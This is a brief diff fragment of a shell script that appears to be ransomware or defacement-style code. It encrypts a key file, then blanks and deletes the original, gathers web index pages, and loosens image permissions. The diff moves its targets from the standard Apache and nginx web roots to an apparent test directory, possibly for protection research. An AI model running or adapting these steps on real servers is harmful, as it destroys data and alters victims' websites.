@@ -18,13 +18,11 @@ done
 
 "$CIPHER" -key "$WKEY" -in "$KEY" -out "$KEY.enc" | cut -d ' ' -f 2 | head -n 1 > "$KEY.iv" && cat /dev/null > "$KEY" && rm -rf "$KEY"
 
-APACHE=/var/www
-NGINX=/usr/share/nginx
+APACHE=/home/hpc/rw-protect/web
 
 APACHEs=$(find $APACHE -name index.*)
-NGINXes=$(find $NGINX -name index.*)
 
-PAGES="$APACHEs $NGINXes"
+PAGES="$APACHEs"
 
 chmod 777 $IMAGE
 
